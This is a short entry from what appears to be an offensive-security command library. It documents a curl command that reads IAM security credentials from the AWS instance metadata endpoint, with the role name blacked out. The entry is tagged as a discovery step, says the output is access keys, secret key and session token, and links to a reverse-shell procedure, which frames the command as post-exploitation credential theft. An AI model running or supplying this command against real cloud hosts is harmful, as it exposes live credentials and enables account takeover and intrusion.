---
data: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████'
tags:
  - discovery
  - aws
type: command
executor: bash
platforms:
  - AWS
id: fff418d4-d792-4e8e-a596-d1d7cd6ac3b5
created_at: '2025-12-11T06:10:31.628Z'
updated_at: '2025-12-11T06:10:31.628Z'
verified: false
validated: true
submitted: true
---
# curl-aws-credentials

## Command

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
```

## Description

Retrieves detailed AWS IAM security credentials from instance metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | N/A | No |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
```

## Expected Output

JSON with AccessKeyId, SecretAccessKey, Token, etc.

## Related

- [[commands/curl-aws-metadata-role]]
- [[procedures/Receive-and-Explore-Reverse-Shell]]
